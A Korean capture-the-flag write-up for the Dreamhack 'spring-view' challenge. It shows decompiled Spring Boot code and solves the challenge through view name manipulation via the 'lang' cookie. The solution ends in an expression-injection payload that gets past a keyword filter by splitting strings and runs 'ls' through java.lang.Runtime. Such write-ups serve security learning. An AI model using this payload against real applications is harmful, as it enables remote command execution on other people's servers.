## spring-view (풀이 참고)
---

jar 파일이 주어지는데 이 파일을 zip으로 변환한 뒤, BOOT-INF 폴더에 있는 파일들을 분석한다.

이 폴더 안에는 classes 폴더가 있는데 여기에 개발자 정의 클래스 등이 있다.

아래는 그 클래스들을 디컴파일 한 코드이다.

<br>

+ Application.class

```java
package com.dreamhack.spring;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class Application
{
    public static void main(final String[] args) {
        SpringApplication.run((Class)Application.class, args);
    }
```

<br>

+ DataFilter.class

```java
package com.dreamhack.spring;

import javax.servlet.http.Cookie;
import java.util.stream.Stream;
import java.util.function.Predicate;
import java.util.Objects;
import java.util.Arrays;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import org.slf4j.LoggerFactory;
import org.slf4j.Logger;
import org.springframework.core.annotation.Order;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.HandlerInterceptor;

@Configuration
@Order(Integer.MIN_VALUE)
public class DataFilter implements HandlerInterceptor
{
    Logger log;
    final String[] DANGEROUS_STRINGS;
    
    public DataFilter() {
        this.log = LoggerFactory.getLogger((Class)UserController.class);
        this.DANGEROUS_STRINGS = new String[] { "Runtime", "java", "class" };
    }
    
    public boolean preHandle(final HttpServletRequest request, final HttpServletResponse response, final Object obj) throws Exception {
        final String requestURI = request.getQueryString();
        if (requestURI != null) {
            final Stream<String> stream = Arrays.stream(this.DANGEROUS_STRINGS);
            final String obj2 = requestURI;
            Objects.requireNonNull(obj2);
            if (stream.anyMatch(obj2::contains)) {
                response.sendError(403, "Access Denied !");
            }
        }
        final Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (int i = 0; i < cookies.length; ++i) {
                final Stream<String> stream2 = Arrays.stream(this.DANGEROUS_STRINGS);
                final String value = cookies[i].getValue();
                Objects.requireNonNull(value);
                if (stream2.anyMatch(value::contains)) {
                    response.sendError(403, "Access Denied !");
                }
            }
        }
        return true;
    }
}
```

<br>

+ UserController.class

```java
package com.dreamhack.spring;

import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.util.WebUtils;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestParam;
import org.slf4j.LoggerFactory;
import org.slf4j.Logger;
import org.springframework.stereotype.Controller;

@Controller
public class UserController
{
    Logger log;
    
    public UserController() {
        this.log = LoggerFactory.getLogger((Class)UserController.class);
    }
    
    @GetMapping({ "/" })
    public String index(@RequestParam(value = "lang", required = false) final String lang, final Model model, final HttpServletRequest request, final HttpServletResponse response) {
        if (lang != null) {
            response.addCookie(new Cookie("lang", lang));
            return "redirect:/";
        }
        final Cookie cookie_lang = WebUtils.getCookie(request, "lang");
        if (cookie_lang == null) {
            response.addCookie(new Cookie("lang", "en"));
        }
        model.addAttribute("message", (Object)"Spring World !");
        return "index";
    }
    
    @GetMapping({ "/welcome" })
    public String welcome(@CookieValue(value = "lang", defaultValue = "en") final String lang) {
        return lang + "/welcome";
    }
    
    @GetMapping({ "/signup" })
    public String signup(@CookieValue(value = "lang", defaultValue = "en") final String lang) {
        return lang + "/underconstruction";
    }
    
    @GetMapping({ "/signin" })
    public String signin(@CookieValue(value = "lang", defaultValue = "en") final String lang) {
        return lang + "/underconstruction";
    }
}
```

<br>

+ Webconfig.class

```java
package com.dreamhack.spring;

import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

@Configuration
public class WebConfig extends WebMvcConfigurerAdapter
{
    public void addInterceptors(final InterceptorRegistry registry) {
        registry.addInterceptor((HandlerInterceptor)new DataFilter());
    }
}
```

<br><br>

## Solution
---

Spring View Name Manipulation 취약점인데, 내부 라이브러리에서 발생한 취약점이다. (블로그 확인)

루트 페이지 말고 다른 페이지를 요청할 때 리턴 값으로 ```lang + "/welcome"``` 이런 식으로 lang 변수를 붙여서 리턴하는 것을 볼 수 있다.

템플릿을 렌더링 할 때 거치는 과정에서 취약점이 발생하는데, lang 값은 쿠키 값이므로 쿠키 lang 값에 예를 들어, ```${7*7}```을 설정한 뒤, welcome 페이지에 들어가면 에러가 발생하게 되는데 에러 페이지에 ```${7*7}/welcome```가 있음을 볼 수 있다.

<br>

따라서 다시 쿠키 값을 ```${7*7}::x```로 설정하면 ```49```라 출력될 것이다.

이제 플래그를 찾아야 되는데, 문제에서 ```java, Runtime, class```를 필터링하여 우회해야 한다.

**유의할 점은 쿠키에는 넣을 수 있는 데이터의 크기가 제한되어 있으며 쿠키에는 쌍따옴표, 공백 등의 특수문자 일부가 들어가면 안된다.**

<br>

풀이를 보기 전 시도했던 방법은 <a href="https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass" target="_blank">pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass</a>을 참고하였다.

해서 ```true.getClass().forName('java.lang.Runtime').Runtime().exec('ls').getInputStream()```을 charAt을 통해 필터링을 우회해서 넣었으나.. 잘 몰랐던 사실이 있었다.

이걸 출력하려면.. ```java.util.Scanner```를 이용해야 한다는 것을 몰랐다.

이를 모른채 한참을 헤매다가 결국 slow thinker 님의 풀이를 살짝 보았다..

<br>

풀이를 참고하여 다른 방식으로 넣었다. 물론 이것도 한참을 헤댔다..

기본 틀은 맨 처음 보았던 ```new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ls').getInputStream()).next()```를 따라가기로 했다.

우선 알아야 할 점이 있는데, 첫 째로 ```java.util.Scanner```의 생성자 인자 중에 ```InputStream```이 있음을 확인할 수 있다.

출처 : <a href="https://techvidvan.com/tutorials/java-scanner-class/" target="_blank">techvidvan.com/tutorials/java-scanner-class/</a>

<br>

![image](https://user-images.githubusercontent.com/52172169/182277404-60821136-32fa-4186-9267-cd5a2ac8f662.png)

<br>

두 번째는 ```java.lang.Runtime.getRuntime().exec()```에서 ```exec()``` 메소드의 리턴 타입은 ```Process```이다.

확인 : <a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html" target="_blank">docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html</a>

<br>

세 번째는 읽으려면 ```getInputStream()```을 사용해야 하는데, 이 메소드의 리턴형은 ```InputStream```이다.

위의 사실을 모르고 중간중간 값이 잘 들어갔는지 확인하려고 하다보니 당연히 잘 맞게 넣지 않는 이상 오류가 날 수 밖에 없었다. 

<br>

페이로드는 아래와 같다.

```${''.getClass().forName('j'+'ava.util.Scanner').getConstructor(''.getClass().forName('j'+'ava.io.InputStream')).newInstance(''.getClass().forName('j'+'ava.lang.Run'+'time').getMethods()[6].invoke(null).exec('ls').getInputStream()).next()}::```
 
